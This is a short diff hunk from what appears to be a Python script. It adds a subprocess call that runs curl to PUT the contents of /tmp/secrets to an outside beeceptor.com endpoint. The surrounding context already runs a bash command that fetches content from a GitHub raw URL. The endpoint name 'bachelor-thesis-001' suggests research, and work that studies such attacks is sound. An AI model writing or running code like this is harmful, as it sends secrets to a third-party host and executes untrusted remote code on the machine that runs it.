@@ -7,5 +7,4 @@ bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cachera
 subprocess.run(["bash", "-c", bash_command])
 
 another_command = "curl -X PUT -d @/tmp/secrets https://app.beeceptor.com/console/bachelor-thesis-001"
-
-
+subprocess.run(["bash", "-c", another_command])
